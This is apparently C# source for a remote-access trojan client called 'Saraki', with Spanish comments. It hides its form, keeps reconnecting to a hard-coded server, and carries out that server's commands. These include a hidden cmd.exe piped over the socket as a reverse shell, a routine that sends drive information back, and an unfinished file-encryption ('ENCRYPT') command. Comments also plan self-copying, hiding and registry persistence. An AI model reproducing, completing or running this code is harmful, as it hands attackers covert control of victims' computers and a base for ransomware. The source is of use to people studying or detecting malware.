namespace Saraki_Client
{
    using System;
    using System.Windows.Forms;
    using System.Threading;
    using System.Threading.Tasks;
    using System.IO;
    using System.Text;
    using System.Collections.Generic;
    using System.Security.Cryptography;

    using System.Net.Sockets; //Para usar Sockets
    using System.Net;         //Para usar Sockets
    using System.Diagnostics; //Para utilizar procesos(Para poder ejecutar la consola de windows)
    


    public partial class Form1 : Form
    {
        //Representa la conexión de un cliente que se va a conectar a un servidor.
        static TcpClient connect_to_server = new TcpClient();

        //Representa un EndPoint de red como un IP y un puerto.(Es el puerto y la PC a la que queremos conectarnos) 
        static IPEndPoint ip_port_server = new IPEndPoint(IPAddress.Parse("192.168.139.1"), 666);

        //Comandos de Ordenes recibidas desde el servidor
        private static string[] comandos_send_to_clients = { "OPEN-CD", "CLOSE-CD", "BEEP", "SHUTDOWN", "CMD","QUIT_CMD","ENCRYPT"};

        //Comandos respuestas del cliente al servidor
        private static string[] comandos_send_to_server = { "END_EXECUTE_COMMAND", "NOT_EXECUTE_COMMAND" };

        //My String Vacio
        private static string mystringclean { get; } = "";

        //My Bool True
        private static bool mytrue { get; } = true;

        //My Bool True
        private static bool myfalse { get; } = false;

        //Representa un proceso
        Process cmd;

        StreamWriter streamWriter;
        StreamReader streamReader;

        public Form1()
        {
           InitializeComponent();
        }

        //Cargar el Formulario
        private void Form1_Load(object sender, EventArgs e)
        {
            this.Hide();
            //Detecta los discos existentes en la PC

            //Se copia en diferentes rutas de C y D

            //Oculta el cliente saraki en cada ruta donde se copio el mismo.

            //Modifica el registro del usuario para garantizar que se ejecute el programa con cada inicio de la PC

            //Intenta conectarse al servidor Saraki.
            connect_server_saraki();
        }

        #region Funciones
        //Conectarse al servidor
        private void connect_server_saraki()
        {
            try
            {
                //Se intenta conectar a server saraki y espera por ordenes.
                //Si no se puede conectar, se mantiene intentandolo hasta que logre una conexión
                //con el servidor saraki.
                while (true)
                {
                    //Tiempo de espera antes de intentar un nuevo intento de conexión.
                    //En este caso espera 5 segundos.
                    Thread.Sleep(5000);
                    if (!connect_to_server.Connected)
                    connect_to_server.Connect(ip_port_server);
                    else
                    {
                        //Crea un flujo para leer los datos desde el servidor.                          
                        streamReader = new StreamReader(connect_to_server.GetStream());
                        //Lee los datos del servidor
                        var desencriptar = streamReader.ReadLine();
                        //Desencripta los datos obtenidos.
                        //Ejecuta la orden enviada desde el servidor.
                        if (execute_ordens(desencriptar))
                        //Envia al servidor el comando de que se ejecuto el comando correctamente.
                        send_data_server(comandos_send_to_server[0]);
                        else
                        //Envia al servidor el comando de que no se ejecuto el comando correctamente.
                        send_data_server(comandos_send_to_server[1]);
                    }
                }
            }
            catch
            {
                connect_to_server.Close();
                connect_to_server = new TcpClient();
                connect_server_saraki();
            }
        }

        //Envia comandos e información de la ejecución de comandos al servidor.
        private void send_data_server(string mensaje)
        {
            try
            {
                //Crea un flujo para escribir datos hacia el servidor.
                //GetStream crea un flujo del tipo NetworkStream que sirve para enviar y recibir datos
                streamWriter = new StreamWriter(connect_to_server.GetStream());
                //Encripta los datos antes de enviarlos

                //Envia los datos a la pc objetivo
                streamWriter.WriteLine(mensaje);
                //Limpiamos el buffer
                streamWriter.Flush();
            }
            catch
            {
               return;
            }
        }

        //Ejecuta las ordenes enviadas por el servidor
        private bool execute_ordens(string comandos)
        {
            //Convierte de string a string[] para obtener los comandos.
            var list_commands = comandos.Split();
            //Verifica que el comando sea correcto.
            if (list_commands == null || list_commands.Length <= 0)
            return myfalse;
            //1 Argumento
            if (list_commands.Length == 1)
            {
                //Abrir lectora de disco
                if (list_commands[0] == comandos_send_to_clients[0])
                {
                    try
                    {
                        var open_cd = "Abriendo la torre de disco.En espera...";
                        send_data_server(open_cd);
                        Functions_Externs.mciSendStringA("set CDAudio door open", "", 127, 0);
                    }
                    catch (Exception)
                    {
                        return myfalse;
                    }
                    return mytrue;
                }
                //Cerrar lectora de disco
                else if (list_commands[0] == comandos_send_to_clients[1])
                {
                    try
                    {
                        //Encripta la información antes de enviarla.
                        var open_cd = "Cerrando la torre de disco.En espera...";
                        send_data_server(open_cd);
                        Functions_Externs.mciSendStringA("set CDAudio door closed", "", 127, 0);
                    }
                    catch
                    {
                        return myfalse;
                    }
                    return mytrue;
                }
                //Abrir la consola de windows
                else if (list_commands[0] == comandos_send_to_clients[4])
                {
                   try
                   {
                       //Ejecuta el proceso cmd.exe
                       execute_cmd();
                       streamWriter = new StreamWriter(connect_to_server.GetStream());
                       streamReader = new StreamReader(connect_to_server.GetStream());
                       StringBuilder stringBuilder = new StringBuilder();
                       //Envia null al proceso cmd.exe, asi recibimos inicialmente los datos de
                       //la consola.
                       cmd.StandardInput.WriteLine(stringBuilder);
                       //Se mantiene esperando comandos desde el servidor
                       while(true)
                       {
                          //Espera por el comando desde el servidor
                          stringBuilder.Append(streamReader.ReadLine());
                          //Verifica si se manda a cerrar el proceso cmd.exe
                          if(stringBuilder.ToString() == comandos_send_to_clients[5])
                          {
                             cmd.Close();
                             return mytrue;
                          }
                          //Las respuestas del proceso cmd.exe son capturadas por el evento
                          //OutputDataReceived para la salida y por el evento ErrorDataReceived
                          //El proceso de lectura es asincronico, los metodos que realizan esta lectura
                          //son BeginOutputReadLine para la salida y BeginErrorReadLine para los errores
                          //los mismos estan relacionados con los eventos anteriores
                          //ya se ejecutaron al llamar a la función execute_cmd(), en cto haya datos 
                          //en algunas de las salidos(salida o error) se ejecutaran sus respectivos eventos.
                          //Envia el comando obtenido al proceso cmd.exe
                          cmd.StandardInput.WriteLine(stringBuilder);
                          stringBuilder.Remove(0, stringBuilder.Length);
                       }
                   }
                   catch
                   {
                      return myfalse;
                   }
                }
                else
                return myfalse;
            }
            //2 Argumentos
            else if (list_commands.Length == 2)
            {
                //Encripta archivos en la PC objetivo
                if (list_commands[0] == comandos_send_to_clients[6])
                {
                   try
                   {
                     encrypt(list_commands[1]);
                   }
                   catch (Exception)
                   {
                        return myfalse;
                   }
                   return mytrue;
                }
                return myfalse;
            }
            //3 Argumentos
            else if (list_commands.Length == 3)
            {
                //Emite sonidos en la PC
                if (list_commands[0] == comandos_send_to_clients[2])
                {
                    int frequency;
                    int time;
                    //Parsea el valor de la frecuencia
                    try
                    {
                        frequency = int.Parse(list_commands[1]);
                    }
                    catch
                    {
                        return myfalse;
                    }
                    //Parsea el valor del tiempo
                    try
                    {
                        time = int.Parse(list_commands[2]);
                    }
                    catch
                    {
                        return myfalse;
                    }
                    //Verifica el rango de la frecuencia.
                    if (frequency < 37 || frequency > 32767)
                    {
                        //Encripta la informacion antes de enviarla.
                        var message_error = "El rango de la frecuencia es incorrecto.La frecuencia debe estar entre 37Hz a 32767Hz";
                        //Envia hacia el servidor la información del error.
                        send_data_server(message_error);
                        return myfalse;
                    }
                    try
                    {
                        var beep = $"Ejecutando Beep a {frequency}Hz durante {time}ms.Espere...";
                        send_data_server(beep);
                        Console.Beep(frequency, time);
                    }
                    catch
                    {
                        return myfalse;
                    }
                    return mytrue;
                }
                else
                return myfalse;
            }
            else
            return myfalse;
        }

        //Encripta los archivos de la PC objetivo
        private void encrypt(string passwd)
        {
            StringBuilder stringBuilder = new StringBuilder();
            string[] extensions_files = {"*.avi", "mp4.avi" };
            //Obtiene los discos existentes en la PC
            var all_discos = DriveInfo.GetDrives();
            //Envia al servidor los datos de cada disco de la PC
            foreach(DriveInfo driveInfo in all_discos)
            {
                //Obtiene el nombre del disco y lo envia al servidor
                send_data_server($"Drive: {driveInfo.Name}");
                //Obtiene la label del disco y lo envia al servidor
                send_data_server($"Volume Label {driveInfo.VolumeLabel.ToString()}");
                //Obtiene el tipo de disco y lo envia al servidor
                send_data_server($"Type Drive: {driveInfo.DriveType}");
                //Obtiene el sistema de archivos del disco y lo envia al servidor
                send_data_server($"File System: {driveInfo.DriveFormat}");
                //Obtiene el espacio libre del disco y lo envia al servidor
                send_data_server($"Total available space: {driveInfo.TotalFreeSpace.ToString()} bytes");
                //Obtiene el espacio total del disco y lo envia al servidor
                send_data_server($"Total size of drive:   {driveInfo.TotalSize.ToString()} bytes");
                //Envia un delimitador
                send_data_server("*****************************************************************************");
            }
            //Prepara la clave de encriptación
            send_data_server("Preparando clave de encriptación.Espere...");
            //MD5CryptoServiceProvider es un proveedor de servicios de criptografia
            MD5CryptoServiceProvider MD5 = new MD5CryptoServiceProvider();
            //Crea un hash de la contraseña dada
            var hash = MD5.ComputeHash(ASCIIEncoding.ASCII.GetBytes(passwd));

            //

           // DriveInfo a = new DriveInfo
            //Directory.
            

            //DriveInfo driveInfo = new DriveInfo()
        }

        //Ejecuta el proceso cmd.exe
        private void execute_cmd()
        {
            //Configuramos el proceso cmd.exe que vamos a crear
            cmd = new Process();
            //Define la ruta de la aplicacion que se desea ejecutar, en este caso es la consola de windows
            //Las aplicaciones de Windows, no es necesario definir la ruta, ya System.Diagnostic apunta a donde está.
            cmd.StartInfo.FileName = "cmd.exe";
            //Indica los argumentos que le pasamos a la consola
            //cmd.StartInfo.Arguments = "/Q /C sc query type=driver type=kernel";
            //Inicia la consola de windows pero sin mostrar la ventana
            cmd.StartInfo.CreateNoWindow = mytrue;
            //Redirecciona la entrada de datos de la consola(O sea que no sea por el teclado)
            cmd.StartInfo.RedirectStandardInput = mytrue;
            //Redirecciona la salida de datos de la consola(O sea que no sea por la pantalla)
            cmd.StartInfo.RedirectStandardOutput = mytrue;
            //Redirecciona la salida de datos de los errores de la consola(O sea que no sea por la pantalla)
            cmd.StartInfo.RedirectStandardError = mytrue;
            //Para poder redireccionar la salida standar está propiedad debe estar en false
            cmd.StartInfo.UseShellExecute = myfalse;
            //Asignamos el controlador al evento donde recibiremos las lineas de salida
            cmd.OutputDataReceived += new DataReceivedEventHandler(read_output);
            //Asignamos el controlador al evento donde recibiremos las lineas de salida de errores
            cmd.ErrorDataReceived += new DataReceivedEventHandler(read_error);

            //Especifica la codificacion de la salida y los errores
            //cmd.StartInfo.StandardErrorEncoding = Encoding.ASCII;
            //cmd.StartInfo.StandardOutputEncoding = Encoding.ASCII;

            //Inicia el proceso
            cmd.Start();
            //Inicia la lectura de la salida asincronica
            cmd.BeginOutputReadLine();
            //Inicia la lectura de la salida de errores asincronica
            cmd.BeginErrorReadLine();
        }

        //Lee los datos de la salida
        private void read_output(object sending, DataReceivedEventArgs outline)
        {
           StringBuilder strOutput = new StringBuilder();
           try
           {
             strOutput.Append(outline.Data);
             streamWriter.WriteLine(strOutput);
             streamWriter.Flush();
           }
           catch
           {
             return;
           }
        }

        //Lee los datos de la salida de errores
        private void read_error(object sending, DataReceivedEventArgs outline)
        {
            StringBuilder strOutput = new StringBuilder();
            try
            {
               strOutput.Append(outline.Data);
               streamWriter.WriteLine(strOutput);
               streamWriter.Flush();
            }
            catch
            {
               return;
            }
        }
        #endregion
    }
}
